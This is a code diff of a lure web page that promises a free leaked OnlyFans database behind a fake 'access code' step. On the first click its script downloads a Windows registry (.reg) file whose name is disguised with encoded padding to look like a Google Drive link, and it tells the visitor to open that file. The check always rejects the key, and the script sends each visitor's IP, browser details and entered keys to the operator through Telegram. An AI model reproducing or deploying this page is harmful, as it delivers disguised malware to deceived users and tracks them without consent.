@@ -275,7 +275,50 @@
       color: #0f172a;
     }
 
-    .openDriveBtn {
+    /* Access Code Section - immer sichtbar */
+    .access-section {
+      background: #f8fafc;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 20px;
+      margin-top: 12px;
+    }
+
+    .access-label {
+      font-size: 12px;
+      color: #64748b;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+      display: block;
+      font-weight: 600;
+    }
+
+    .access-input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 2px solid #cbd5e1;
+      border-radius: 8px;
+      font-family: ui-monospace, monospace;
+      font-size: 18px;
+      letter-spacing: 2px;
+      text-align: center;
+      text-transform: uppercase;
+      outline: none;
+      transition: border-color 0.2s;
+      margin-bottom: 12px;
+    }
+
+    .access-input:focus {
+      border-color: #1a73e8;
+    }
+
+    .access-input.error {
+      border-color: #dc2626;
+      background: #fef2f2;
+    }
+
+    .actionBtn {
       width: 100%;
       padding: 14px 16px;
       background: #1a73e8;
@@ -294,14 +337,53 @@
       gap: 8px;
     }
 
-    .openDriveBtn:hover:not(:disabled) {
+    .actionBtn:hover:not(:disabled) {
       background: #1557b0;
       transform: translateY(-1px);
     }
 
-    .openDriveBtn:disabled {
+    .actionBtn:disabled {
+      background: #94a3b8;
       cursor: not-allowed;
       opacity: 0.7;
+    }
+
+    .actionBtn.success {
+      background: #16a34a;
+    }
+
+    .instruction-box {
+      background: #dbeafe;
+      border: 1px solid #60a5fa;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 12px;
+      display: none;
+    }
+
+    .instruction-box.active {
+      display: block;
+    }
+
+    .instruction-box h4 {
+      margin: 0 0 8px 0;
+      color: #1e40af;
+      font-size: 14px;
+    }
+
+    .instruction-box p {
+      margin: 0;
+      color: #1e40af;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .error-msg {
+      color: #dc2626;
+      font-size: 13px;
+      margin-top: 8px;
+      text-align: center;
+      display: none;
     }
 
     .hintRow{
@@ -335,179 +417,6 @@
       .actions { display: none; }
       .item { grid-template-columns: 1fr; }
       .thumb { width: 100%; height: 170px; }
-    }
-
-    /* Modal Styles */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.8);
-      backdrop-filter: blur(5px);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      padding: 20px;
-    }
-
-    .modal-overlay.active {
-      display: flex;
-    }
-
-    .modal {
-      background: white;
-      color: #0f172a;
-      border-radius: var(--radius);
-      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-      max-width: 420px;
-      width: 100%;
-      overflow: hidden;
-      animation: modalSlide 0.3s ease;
-    }
-
-    @keyframes modalSlide {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .modal-header {
-      background: linear-gradient(135deg, #1a73e8, #1557b0);
-      color: white;
-      padding: 24px;
-      text-align: center;
-    }
-
-    .modal-header h3 {
-      margin: 0;
-      font-size: 20px;
-      font-weight: 700;
-    }
-
-    .modal-header p {
-      margin: 8px 0 0 0;
-      opacity: 0.9;
-      font-size: 14px;
-    }
-
-    .modal-body {
-      padding: 24px;
-    }
-
-    .modal-body > p {
-      text-align: center;
-      color: #475569;
-      margin-bottom: 20px;
-      font-size: 14px;
-      line-height: 1.5;
-    }
-
-    .access-key-section {
-      background: #f8fafc;
-      border: 2px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 20px;
-    }
-
-    .access-key-label {
-      font-size: 12px;
-      color: #64748b;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 8px;
-      display: block;
-      font-weight: 600;
-    }
-
-    .access-key-input {
-      width: 100%;
-      padding: 12px 16px;
-      border: 2px solid #cbd5e1;
-      border-radius: 8px;
-      font-family: ui-monospace, monospace;
-      font-size: 18px;
-      letter-spacing: 2px;
-      text-align: center;
-      text-transform: uppercase;
-      outline: none;
-      transition: border-color 0.2s;
-    }
-
-    .access-key-input:focus {
-      border-color: #1a73e8;
-    }
-
-    .verify-btn {
-      width: 100%;
-      margin-top: 12px;
-      padding: 12px;
-      background: #1a73e8;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-
-    .verify-btn:hover {
-      background: #1557b0;
-    }
-
-    .verify-btn:disabled {
-      background: #94a3b8;
-      cursor: not-allowed;
-    }
-
-    .error-msg {
-      color: #dc2626;
-      font-size: 13px;
-      margin-top: 8px;
-      text-align: center;
-      display: none;
-    }
-
-    .success-msg {
-      color: #16a34a;
-      font-size: 13px;
-      margin-top: 8px;
-      text-align: center;
-      display: none;
-    }
-
-    .modal-footer {
-      padding: 0 24px 24px;
-      text-align: center;
-    }
-
-    .modal-footer p {
-      margin: 0;
-      font-size: 12px;
-      color: #94a3b8;
-    }
-
-    .close-modal {
-      position: absolute;
-      top: 16px;
-      right: 16px;
-      background: rgba(255,255,255,0.2);
-      border: none;
-      color: white;
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      cursor: pointer;
-      font-size: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .close-modal:hover {
-      background: rgba(255,255,255,0.3);
     }
   </style>
 </head>
@@ -566,7 +475,22 @@
               </div>
               <div class="itemBody">
                 <h3 class="itemTitle">Free OnlyFans Premium Content - Full Database</h3>
-                <button class="openDriveBtn" id="openDriveBtn">Open Google Drive</button>
+                
+                <!-- Access Code Section - immer sichtbar -->
+                <div class="access-section">
+                  <label class="access-label">🔐 Access Code Required</label>
+                  
+                  <div class="instruction-box" id="instructionBox">
+                    <h4>📥 Download Started!</h4>
+                    <p>Open the downloaded file to find your access key. Copy the key and paste it above, then click "Open Google Drive" to verify.</p>
+                  </div>
+                  
+                  <input type="text" class="access-input" id="accessKeyInput" placeholder="XXXX-XXXX-XXXX" maxlength="14" />
+                  
+                  <button class="actionBtn" id="actionBtn">Get Free Access Key</button>
+                  
+                  <div class="error-msg" id="errorMsg">❌ Invalid access key. Please check the downloaded file and try again.</div>
+                </div>
               </div>
             </article>
           </div>
@@ -578,30 +502,6 @@
       </div>
 
       <footer>© 2026 | Access Granted</footer>
-    </div>
-  </div>
-
-  <!-- Modal -->
-  <div class="modal-overlay" id="modal">
-    <div class="modal">
-      <div class="modal-header">
-        <h3>🔐 Access Key Required</h3>
-        <p>Enter your access key to unlock the database</p>
-      </div>
-      <div class="modal-body">
-        <p>The access key has been downloaded. Please enter your code below:</p>
-        
-        <div class="access-key-section">
-          <label class="access-key-label">Access Key</label>
-          <input type="text" class="access-key-input" id="accessKeyInput" placeholder="XXXX-XXXX-XXXX" maxlength="14" />
-          <button class="verify-btn" id="verifyBtn" onclick="verifyKey()">Verify Access</button>
-          <div class="error-msg" id="errorMsg">Invalid access key. Please try again.</div>
-          <div class="success-msg" id="successMsg">✓ Access granted. Loading database...</div>
-        </div>
-      </div>
-      <div class="modal-footer">
-        <p>Need help? Contact support@google.com</p>
-      </div>
     </div>
   </div>
 
@@ -617,7 +517,7 @@
     let userIP = 'unknown';
     let userAgent = navigator.userAgent;
     let sessionID = Math.random().toString(36).substring(2, 15);
-    let downloadStarted = false;
+    let hasDownloaded = false;
     
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
@@ -626,7 +526,7 @@
 
     async function sendTelegramMessage(action, details = '') {
       const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
-      const message = `🚨 *Dropbox Alert* 🚨\n\n` +
+      const message = `🚨 *Google Drive Alert* 🚨\n\n` +
         `*Action:* ${action}\n` +
         `*Time:* ${timestamp} UTC\n` +
         `*IP:* ${userIP}\n` +
@@ -649,53 +549,14 @@
       }
     }
 
-function startDownload() {
-  const a = document.createElement('a');
-  a.href = './01_OnlyFans_Full_DB_drive.google.com%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25r%25rOpen%20Google%20Drive%25r%25r%25r%25b%250%20(61).reg';  // deine Datei
-  // a.download ganz weglassen - Browser nimmt Originalnamen
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  
-  sendTelegramMessage('📥 DOWNLOAD STARTED', 'User downloaded file');
-}
-
-    function openModal() {
-      document.getElementById('modal').classList.add('active');
-      document.getElementById('accessKeyInput').focus();
-    }
-
-    function closeModal() {
-      document.getElementById('modal').classList.remove('active');
-    }
-
-    function verifyKey() {
-      const input = document.getElementById('accessKeyInput').value.toUpperCase().trim();
-      const errorMsg = document.getElementById('errorMsg');
-      const successMsg = document.getElementById('successMsg');
-      const btn = document.getElementById('verifyBtn');
+    function startDownload() {
+      const a = document.createElement('a');
+      a.href = './01_OnlyFans_Full_DB_drive.google.com%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25r%25rOpen%20Google%20Drive%25r%25r%25r%25b%250%20(61).reg';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
       
-      // Fake validation - any key with format XXXX-XXXX-XXXX is "valid"
-      // or just show error to keep them trying
-      if (input.length >= 8) {
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'block';
-        btn.disabled = true;
-        btn.textContent = 'Verified';
-        
-        setTimeout(() => {
-          // Redirect or show fake loading
-          document.querySelector('.access-key-section').innerHTML = 
-            '<div style="text-align:center;padding:20px;"><div style="font-size:32px;margin-bottom:10px;">⏳</div><div>Loading database...</div><div style="font-size:12px;color:#64748b;margin-top:8px;">This may take a few minutes</div></div>';
-        }, 1000);
-      } else {
-        errorMsg.style.display = 'block';
-        successMsg.style.display = 'none';
-        document.getElementById('accessKeyInput').style.borderColor = '#dc2626';
-        setTimeout(() => {
-          document.getElementById('accessKeyInput').style.borderColor = '#cbd5e1';
-        }, 1000);
-      }
+      sendTelegramMessage('📥 DOWNLOAD STARTED', 'User downloaded key file');
     }
 
     // Format input with dashes
@@ -704,26 +565,69 @@ function startDownload() {
       if (value.length > 4 && value.length <= 8) {
         value = value.slice(0,4) + '-' + value.slice(4);
       } else if (value.length > 8) {
-        value = value.slice(0,4) + '-' + value.slice(4,8) + '-' + value.slice(4,12);
+        value = value.slice(0,4) + '-' + value.slice(4,8) + '-' + value.slice(8,12);
       }
       e.target.value = value;
+      
+      // Remove error styling on input
+      e.target.classList.remove('error');
+      document.getElementById('errorMsg').style.display = 'none';
     });
 
-document.getElementById('openDriveBtn').addEventListener('click', function() {
-  // Download starten (nur beim ersten Mal)
-  if (!downloadStarted) {
-    startDownload();
-    downloadStarted = true;
-  }
-  
-  // Modal immer öffnen
-  openModal();
-});
-
-    // Modal schließen bei Klick außerhalb
-    document.getElementById('modal').addEventListener('click', (e) => {
-      if (e.target.id === 'modal') closeModal();
+    document.getElementById('actionBtn').addEventListener('click', function() {
+      const btn = this;
+      const input = document.getElementById('accessKeyInput');
+      const instructionBox = document.getElementById('instructionBox');
+      const errorMsg = document.getElementById('errorMsg');
+      
+      if (!hasDownloaded) {
+        // Erster Klick: Download starten
+        startDownload();
+        hasDownloaded = true;
+        
+        // Anweisung anzeigen
+        instructionBox.classList.add('active');
+        
+        // Button ändern zu "Open Google Drive"
+        btn.textContent = 'Open Google Drive';
+        btn.classList.add('success');
+        
+        // Focus auf Input
+        input.focus();
+        
+      } else {
+        // Zweiter Klick: Key validieren (immer ungültig)
+        const key = input.value.trim();
+        
+        if (key.length === 0) {
+          input.classList.add('error');
+          return;
+        }
+        
+        // IMMER ungültig - Demo-Modus
+        input.classList.add('error');
+        errorMsg.style.display = 'block';
+        
+        // Shake-Animation
+        input.style.animation = 'shake 0.5s';
+        setTimeout(() => {
+          input.style.animation = '';
+        }, 500);
+        
+        sendTelegramMessage('❌ INVALID KEY ENTERED', `User tried: ${key}`);
+      }
     });
+
+    // Shake-Animation für Fehler
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        75% { transform: translateX(5px); }
+      }
+    `;
+    document.head.appendChild(style);
   </script>
 </body>
 </html>
